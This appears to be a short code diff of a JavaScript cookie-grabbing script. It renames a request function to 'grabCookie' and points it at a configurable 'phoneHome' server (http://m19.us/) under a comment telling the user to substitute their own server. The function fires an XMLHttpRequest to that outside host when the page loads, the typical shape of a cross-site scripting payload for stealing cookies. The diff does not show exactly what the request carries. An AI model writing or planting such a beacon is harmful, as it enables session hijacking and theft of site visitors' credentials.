@@ -1,7 +1,7 @@
 /** CHANGE THIS VALUE TO YOUR SERVER **/
 var phoneHome = "http://m19.us/"; // leave trailing slash
 
-function loadXMLDoc()
+function grabCookie()
 {
   var xmlhttp;
   if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
@@ -18,4 +18,4 @@ function loadXMLDoc()
   xmlhttp.send();
 }
 
-loadXMLDoc(phoneHome);
+grabCookie(phoneHome);
